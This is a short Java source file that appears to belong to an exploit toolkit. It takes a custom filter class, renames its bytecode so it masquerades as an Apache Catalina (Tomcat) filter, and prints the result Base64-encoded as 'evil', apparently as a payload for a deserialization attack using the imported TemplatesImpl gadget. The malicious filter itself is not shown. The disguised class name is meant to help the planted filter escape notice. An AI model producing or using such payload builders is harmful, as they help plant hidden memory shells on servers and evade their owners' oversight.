package com.sorry.bug;

import com.sorry.utils.bytetricks.Proxy;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import java.util.Base64;


/**
 * created by 0x22cb7139 on 2021/7/14
 */
public class Debug {
    public static void main(String[] args) {
        try{
            byte[] evil = Proxy.ChangeClassName("com.sorry.bug.CustomFilter","org.apache.catalina.filters.AmazingFilter");
            String evil64 =  Base64.getEncoder().encodeToString(evil);
            System.out.println(evil64);
        }catch (Exception e){
            e.printStackTrace();
        }

    }
}
